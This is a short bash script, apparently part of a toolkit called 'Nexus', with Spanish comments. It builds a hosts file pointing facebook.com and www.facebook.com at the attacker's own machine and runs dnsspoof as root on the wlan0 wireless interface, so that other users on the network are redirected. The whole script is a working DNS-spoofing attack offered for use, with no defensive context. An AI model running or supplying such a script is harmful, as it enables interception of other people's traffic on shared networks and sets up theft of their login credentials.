#!/bin/bash
# NEXUS DNS SPOOFER v1.0

# 1. Crear el archivo de redirección (Hosts)
echo "$(hostname -I | awk '{print $1}') facebook.com" > ~/nexus/conf/dns_spoof.hosts
echo "$(hostname -I | awk '{print $1}') www.facebook.com" >> ~/nexus/conf/dns_spoof.hosts

# 2. Iniciar el envenenador DNS (DNS Spoof)
# Esto intercepta las peticiones UDP puerto 53
su -c "dnsspoof -i wlan0 -f ~/nexus/conf/dns_spoof.hosts" &

echo "[✓] REDIRECCIÓN ACTIVA: 'facebook.com' ahora apunta al Nexo."
